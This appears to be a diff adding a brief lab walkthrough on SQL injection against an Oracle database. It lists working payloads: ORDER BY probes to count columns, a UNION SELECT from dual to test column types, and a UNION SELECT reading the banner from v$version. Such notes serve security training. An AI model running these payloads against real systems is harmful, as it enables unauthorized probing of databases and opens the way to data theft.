@@ -1,0 +1,20 @@
+SQLi - querying the database type and version of Oracle
+
+End goal: display the database version string
+
+Analysis:
+
+1. Determine the number of columns
+
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3-- => internal server error
+
+3 - 1 = 2 columns
+
+2. Determin the data types of the columns
+'UNION select 'a', 'a' from dual-- => Oracle database
+
+3. Output the version of the database
+
+' UNION select banner, NULL from v$version--
